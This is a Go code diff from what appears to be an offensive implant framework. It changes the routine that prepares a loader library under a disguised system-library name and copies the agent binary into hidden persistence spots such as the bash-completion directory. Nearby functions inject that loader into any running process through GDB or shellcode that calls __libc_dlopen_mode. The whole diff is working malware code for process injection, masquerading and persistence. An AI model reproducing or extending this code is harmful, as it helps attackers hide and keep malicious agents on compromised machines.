@@ -68,7 +68,7 @@ func gdbInjectSharedLibWorker(path_to_so string, pid int) error {
 
 // Inject loader.so into any process
 func GDBInjectLoader(pid int) error {
-	so_path, err := prepare_loader_so(pid)
+	so_path, err := prepare_loader_so(pid, "")
 	if err != nil {
 		return err
 	}
@@ -85,7 +85,7 @@ func GDBInjectSharedLib(pid int) error {
 }
 
 // copy agent binary and loader.so to persistent location
-func prepare_loader_so(pid int) (so_path string, err error) {
+func prepare_loader_so(pid int, bin string) (so_path string, err error) {
 	so_path = fmt.Sprintf("/%s/libtinfo.so.2.1.%d",
 		RuntimeConfig.UtilsPath, util.RandInt(0, 30))
 	if os.Geteuid() == 0 {
@@ -102,17 +102,22 @@ func prepare_loader_so(pid int) (so_path string, err error) {
 		}
 	}
 
-	if pid > 0 {
-		// see loader/elf/loader.c
-		agent_path := fmt.Sprintf("%s/_%s",
-			util.ProcCwd(pid),
-			util.FileBaseName(util.ProcExePath(pid)))
-		if HasRoot() {
-			agent_path = fmt.Sprintf("/usr/share/bash-completion/completions/%s",
-				util.FileBaseName(util.ProcExePath(pid)))
-		}
-		err = CopySelfTo(agent_path)
+	// see loader/elf/loader.c
+	exe_file := util.ProcExePath(pid)
+	if pid <= 0 && bin != "" {
+		exe_file = bin
 	}
+	if !util.IsExist(exe_file) {
+		return "", fmt.Errorf("target binary %s not found", exe_file)
+	}
+	agent_path := fmt.Sprintf("%s/_%s",
+		util.ProcCwd(pid),
+		util.FileBaseName(exe_file))
+	if HasRoot() {
+		agent_path = fmt.Sprintf("/usr/share/bash-completion/completions/%s",
+			util.FileBaseName(exe_file))
+	}
+	err = CopySelfTo(agent_path)
 
 	return
 }
@@ -208,7 +213,7 @@ func InjectSharedLib(so_path string, pid int) (err error) {
 // InjectLoader inject loader.so into any process, using shellcode
 // locate __libc_dlopen_mode in memory then use it to load SO
 func InjectLoader(pid int) error {
-	so_path, err := prepare_loader_so(pid)
+	so_path, err := prepare_loader_so(pid, "")
 	if err != nil {
 		return err
 	}
